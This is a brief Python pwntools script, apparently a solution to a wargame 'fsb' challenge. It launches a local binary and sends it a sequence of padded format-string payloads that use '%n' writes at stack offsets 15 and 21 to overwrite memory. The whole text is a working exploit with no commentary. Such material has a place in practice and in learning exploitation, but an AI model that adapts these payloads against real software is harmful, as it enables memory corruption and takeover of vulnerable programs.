from pwn import *

p =process("/home/fsbfsb")

fs = '%134520928x%15$n' + " "*(100-len("%134520932x%15$n"))
fs2 = '%134520932x%15$n' + " "* (100-len("%134520932x%15$n"))
value  = [("%21$n" + " "*(100-len("%21$n"))) ,'0']
p.recv()
p.sendline(fs)
p.recv()
p.sendline(value[0])
p.recv()
p.sendline(fs2)
p.recv()
p.sendline(value[0])
p.recv()

p.sendline(value[1])
print p.recv()
